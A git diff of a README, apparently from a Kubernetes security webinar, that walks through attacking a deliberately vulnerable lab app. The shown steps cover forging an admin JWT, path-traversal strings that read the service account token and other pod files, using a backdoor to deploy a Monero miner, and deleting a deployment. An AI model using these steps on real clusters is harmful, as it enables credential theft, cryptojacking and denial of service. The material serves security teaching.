@@ -42,15 +42,15 @@ Application vulnerabilities can bring wide range of different *attack entrypoint
     - since the manifests are version-controlled, can be found in the Git commit history (`git blame`): [github link](https://github.com/Slurmio/webinar-seck8s/blob/98bab96647708ab5368b5b51ccdf96dd2071894e/03-application-security/vulnerable-app/images-api/deploy/images-api.yaml#L22) (*vulnerability: [Hard-Coded Credentials](https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password)*. Remember: source code is not secret!)
     - the secret is weak therefore very easy to crack - in minutes with the tool [lmammino/jwt-cracker](https://github.com/lmammino/jwt-cracker) (*vulnerability: Weak Secret*)
 
-8. escalate provileges by changing the `"role": "user"` to `"role": "admin"` in the JWT payload (*vulnerability: [Broken User Authentication](https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication)*)
+8. escalate provileges by changing the `"role": "user"` to `"role": "admin"` in the JWT payload (*vulnerability: [Broken User Authentication](https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication)*):
     [![Cracked jwt token](../static/03-application-security/04-jwt-cracked.png)](https://www.youtube.com/watch?v=koTqZS-ThZ8&t=53m09s)
 
-9. proceed to `images-api` with the new token, see the admin page
+9. proceed to `images-api` with the new token, see the admin page:
     [![Images-api admin](../static/03-application-security/05-images-admin.png)](https://www.youtube.com/watch?v=koTqZS-ThZ8&t=53m20s)
 
 ---
 
-10. read some files from the pod: `../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token` (pod service account's token and certificate), `../app.py` (source code of the Flask app), `../../../../../../etc/shadow/proc/1/environ` (pod environment variables), etc. (*vulnerability: [LFI, Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)* + too high privileges as the pod is running as `root` in the container)
+10. read some files from the pod: `../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token` (pod service account's token and certificate), `../app.py` (source code of the Flask app), `../../../../../../etc/shadow/proc/1/environ` (pod environment variables), etc. (*vulnerability: [LFI, Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)* + too high privileges as the pod is running as `root` in the container):
 [![LFI read SA certificate](../static/03-application-security/06-var-run-kubernetes-crt.png)](https://www.youtube.com/watch?v=koTqZS-ThZ8&t=54m44s)
 [![LFI read SA certificate: base64-encoded](../static/03-application-security/07-var-run-kubernetes-crt-base64enc.png)](https://www.youtube.com/watch?v=koTqZS-ThZ8&t=54m45s)
 [![LFI read SA certificate: base64-decoded](../static/03-application-security/08-var-run-kubernetes-crt-base64dec.png)](https://www.youtube.com/watch?v=koTqZS-ThZ8&t=54m56s)
@@ -93,18 +93,18 @@ Application vulnerabilities can bring wide range of different *attack entrypoint
     - install kubectl ([instruction](http://kubernetes.io/docs/tasks/tools/install-kubectl-linux/)):
         - `curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"`
         - `install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl`
-    - `kubectl get all`
+    - `kubectl get all`:
     [![Use shell: kubectl](../static/03-application-security/11-shell-kubectl.png)](https://www.youtube.com/watch?v=koTqZS-ThZ8&t=58m42s)
 
 13. note, the pod's SA has only permissions on Deployments -- it's done by mistake by another developer who accidentally gave extra permissions to the default service account in the namespace `vulnerable-app` (see [vulnerable-app/another-app/deploy/rbac.yaml](vulnerable-app/another-app/deploy/rbac.yaml))
 
 14. now, let's deploy a miner:
     - use the web form [http://images.vulnerable-app.seck8s.slurm.io/?token=...](http://images.vulnerable-app.seck8s.slurm.io/?token=...) to upload the miner's manifest [payloads/monero-deployment.yaml](payloads/monero-deployment.yaml) (note: you need to use the admin JWT token again)
-    - use the backdoor to: `kubectl apply -f images/monero-deployment.yaml`
+    - use the backdoor to: `kubectl apply -f images/monero-deployment.yaml`:
     [![Use shell: run miner](../static/03-application-security/12-shell-miner.png)](https://www.youtube.com/watch?v=koTqZS-ThZ8&t=1h00m36s)
 
 
-15. or shut down the cluster's payload (Deployment only, permitted by RBAC): `kubectl delete deployment auth-api`
+15. or shut down the cluster's payload (Deployment only, permitted by RBAC): `kubectl delete deployment auth-api`:
     [![Use shell: denial-of-service](../static/03-application-security/13-shell-dos.png)](https://www.youtube.com/watch?v=koTqZS-ThZ8&t=1h01m11s)
     [![Result: denial-of-service](../static/03-application-security/14-dos-result.png)](https://www.youtube.com/watch?v=koTqZS-ThZ8&t=1h01m39s)
 
